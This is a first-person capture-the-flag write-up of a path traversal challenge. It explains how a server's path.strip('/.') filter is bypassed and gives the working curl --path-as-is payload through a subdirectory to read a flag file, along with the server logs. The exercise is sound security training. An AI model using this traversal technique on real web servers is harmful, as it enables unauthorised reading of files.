# PATH TRAVERSAL

In this level I was provided with a server file, a 'files' directory with a 'fortunes' subdirectory, and I had to use them to read the flag. Firstly I opened the '/challenge/server' file using 'cat' to read it and found the endpoint I need to use (/data). 
Immediately I bashed a few commands with no success such as,

```bash
curl -v http://challenge.localhost:80
curl -v http://challenge.localhost/data
```

which gave the respective logs in server,

```
127.0.0.1 - - [01/Sep/2026 07:34:46] "GET / HTTP/1.1" 404 -
DEBUG: requested_path='/challenge/files/index.html'
127.0.0.1 - - [01/Sep/2026 07:35:24] "GET /data HTTP/1.1" 200 -
```

seeing this, I realized that what I need to change is actually that 'requested_path' bit. I looked into 'curl' and found a useful flag to use called '--path-as-is' which lets the user-defined path in the query to sustain and not be overwritten by the normal path.
So, I bashed,

```bash
curl --path-as-is -v http://challenge.localhost/data/../../flag
```

Initially, I thought this would work perfectly but strangely enough it didn't, the server log for this request was,

```
DEBUG: requested_path='/challenge/files/flag'
127.0.0.1 - - [01/Sep/2026 09:03:35] "GET /data/../../flag HTTP/1.1" 404 -
```

which means that the 'requested_path' did not consider the '../../' and just processed the flag, getting '/challenge/files/flag' which was obviously a wrong path.
After some more pondering I found the real issue, a specific line in the '/challenge/server' file which made it all make sense.

```python
    requested_path = app.root_path + "/files/" + path.strip("/.")
```

what this line was doing was, stripping the slash(/) and dot(.) from the start and end of my path string, i.e, ../../flag simply becomes flag.
I implemented over this newfound information and bashed the following command,

```bash
curl --path-as-is -v http://challenge.localhost/data/fortunes/../../../flag
```

Essentially what this does is, it goes into the subdirectory 'fortunes' which makes the start of the path string != "/" and ".". Then '../../../flag' to go back three directories and successfully access the flag.
Server log printed this and curl gave me the flag.

```
DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
127.0.0.1 - - [01/Sep/2026 09:25:36] "GET /data/fortunes/../../../flag HTTP/1.1" 200 -
```
